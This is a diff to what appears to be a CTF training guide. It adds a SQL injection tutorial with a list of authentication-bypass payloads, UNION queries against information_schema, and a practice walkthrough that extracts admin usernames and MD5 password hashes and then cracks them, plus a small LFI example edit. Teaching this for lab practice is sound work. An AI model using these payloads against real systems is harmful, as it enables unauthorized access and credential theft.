@@ -74,6 +74,7 @@ Topics to Cover
 	* Other Misconfiguration
 	* Challenges
 * SQL injection
+	* Challenges
 * Local File Inclusion
 	
 	
@@ -304,8 +305,8 @@ Warning: file_put)contents(./nusgreyhats.log): failed to open stream:
 Permission denied in /opt/lampp/htdocs/lfi/login.php on line 10
 ``` 
 
-Example: By accessing http://ctf.nusgreyhats.org/flag.txt, it gives us a ```Object not found!``` page while accessing
-http://ctf.nusgreyhats.org/flag2.txt gives us a  ```Access forbidden!" page. This tell us that ```flag2.txt``` existed
+Example: By accessing http://example.com/flag.txt, it gives us a ```Object not found!``` page while accessing
+http://example.com/flag2.txt gives us a  ```Access forbidden!``` page. This tell us that ```flag2.txt``` existed
 in the server.
 
 Other Misconfigurations
@@ -410,7 +411,177 @@ If you have watch the TV series, you may remember```fsociety00.dat``` and that w
 SQL Injection
 =============
 
-https://www.owasp.org/index.php/Top_10_2013-A1-Injection
+SQL injection is common in web applications when user input is used to form part of a query to be interpreted. The objective
+is to craft a query that trick the interpreter into executing unintended SQL queries.
+
+Take a look at this sentence which give instructions to a robot.
+
+```
+Fetch item number ___ from section ___ of rack number ___, and place it on the conveyor belt.
+```
+
+A typical person will fill each blank in the sentence with only one instruction:
+
+```
+Fetch item "1234" from section "B2" of rack number "12", and place it on the conveyor belt.
+```
+
+A bad person will fill the blank with more instruction than expected but also making sure the sentence make sense.
+
+```
+Fetch item "1234" from section "B2" of rack number "12, and throw it out the window. Then go back to your desk and ignore the
+rest of this form," and place it on the conveyor belt.
+```
+
+Now, let view this example in SQL context. The SQL in the code of a login page may look like this
+
+```
+SELECT * FROM table WHERE username='. $user .' 
+        AND password='. $password .'
+```
+
+Normal user will just supply his username and password to login.
+
+```
+SELECT * FROM table WHERE username='ctf101' 
+        AND password='greyhats'
+```
+
+However, an attacker not knowing the password can input the username as per normal, but filling the password field with
+```1' or '1' = '1```. This still make a valid SQL query, with comparing password to be equal to 1 or "1" = "1". The 1 = 1 
+will return true, thus gaining access to the attacker. 
+
+```
+SELECT * FROM table WHERE username='ctf101' 
+        AND password=' 1' or '1' = '1 '
+```
+
+SQL injection 101
+
+```
+admin' --
+admin' #
+' or '1' = '1
+' or '1' = '1 --
+' or 1=1 #
+
+-- or # is used to comment out the remaining query 
+```
+
+UNION is used to join two SQL query. The number of SELECT field in second query must be equal to the first query.
+
+```
+1' or '1' = '1' union select field1, field2 from table #
+
+1' or '1' = '1' union select table_name from information_schema.tables #
+```
+
+
+Challenges
+----------
+
+### Practical 1: Login
+
+Try logging in with two fields or one of the field or none of the field will return nothing to be displayed. 
+There is a “Forget your password” feature, which we could take a look at it.
+
+Since we do not know any username, we just try some standard name. “admin”, “root”, “user”. If the username 
+is not found, the following message ```No Such User Found``` will be returned, else ```A password recovery email 
+has been sent to user```will be returned
+
+Let try the basic sql injection ```1' or '1' = '1```. And then a whole list of username is returned which mean 
+string is not escaped for the sql query. 
+
+```
+A password recovery email has been sent to 5andy
+A password recovery email has been sent to ctf101
+A password recovery email has been sent to d4ni3l
+A password recovery email has been sent to greyhats
+					......
+```
+
+Let try to see what tables are there in the database with ```1' or '1' = '1' union select table_name 
+from information_schema.tables #```
+
+```
+A password recovery email has been sent to 5andy
+A password recovery email has been sent to ctf101
+A password recovery email has been sent to d4ni3l
+A password recovery email has been sent to greyhats
+					......
+A password recovery email has been sent to CHARACTER_SETS
+A password recovery email has been sent to COLLATIONS
+A password recovery email has been sent to COLLATION_CHARACTER_SET_APPLICABILITY
+A password recovery email has been sent to COLUMNS
+```
+
+Too much information? Let clean up the user details by making the first query evaluate to be false
+```1' and 1=0 union select table_name from information_schema.tables #```
+
+```
+A password recovery email has been sent to CHARACTER_SETS
+A password recovery email has been sent to COLLATIONS
+A password recovery email has been sent to COLLATION_CHARACTER_SET_APPLICABILITY
+A password recovery email has been sent to COLUMNS
+					......
+```
+
+Still find it too messy to find what we want? Let further narrow down our result by just getting tables from the 
+connected database with ```1' and 1=1 UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=database() #```
+
+```
+A password recovery email has been sent to ctf101_login
+```
+
+Look like this is the table we would be interested in. Let see what information the “ctf101_login” table contain.
+```1' and 1=0 union select column_name from information_schema.columns where table_name = 'ctf101_login' #```
+
+```
+A password recovery email has been sent to userID
+A password recovery email has been sent to username
+A password recovery email has been sent to password
+A password recovery email has been sent to type
+A password recovery email has been sent to email
+```
+
+The username, password and type column is what we need. Let see the type of login/account
+```1' and 1=0 union select type from ctf101_login #```
+
+```
+A password recovery email has been sent to normal
+A password recovery email has been sent to admin
+```
+
+There are two type of account availables. “admin” type will be what we are looking for. Let see which username 
+belongs to the “admin” type, ```1' and 1=0 union select username from ctf101_login where type = 'admin' #```
+
+```
+A password recovery email has been sent to n3lson
+A password recovery email has been sent to d4ni3l
+```
+
+“n3lson” and “d4ni3l” are admin. Let get the password of the two admin
+```1' and 1=0 union select password from ctf101_login where username = 'n3lson' #``` # 
+
+```
+A password recovery email has been sent to e9ef7606634776f071dda30ae9c2c00c
+```
+
+and ```1' and 1=0 union select password from ctf101_login where username = 'd4ni3l' #```
+
+```
+A password recovery email has been sent to e3274be5c857fb42ab72d786e281b4b8
+```
+
+Password seem to be hashed. What hash could it be? 32 digit hexadecimal, it could be the popular MD5 hash.
+Let try using http://www.hashkiller.co.uk/md5-decrypter.aspx to crack.
+
+```
+n3lson - adminP@ssw0rd
+d4ni3l - adminpassword
+```
+
+Login in with either one of the username and password to get the flag 
 
 
 ### Practical 3: Blind SQL Injection
